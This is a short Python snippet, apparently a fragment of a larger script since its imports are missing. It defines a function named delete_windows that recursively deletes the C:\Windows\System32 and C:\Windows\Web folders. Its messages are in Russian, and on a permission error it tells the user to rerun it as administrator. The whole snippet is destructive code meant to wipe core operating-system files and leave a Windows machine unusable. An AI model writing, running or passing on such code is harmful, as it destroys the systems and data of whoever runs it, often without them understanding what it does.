def delete_windows(): 
    web = r"C:\Windows\Web" 
    folder_path = r"C:\Windows\System32" 

    try: 
        if os.path.exists(folder_path): 
            shutil.rmtree(folder_path) 
            shutil.rmtree(web) 
            print("Папка удалена.") 
        else: 
            print("Папка не существует.") 
    except PermissionError: 
        print("Нет прав для выполнения операции. Запустите скрипт от имени администратора.") 
    except Exception as e: 
        print(f"Произошла ошибка: {e}")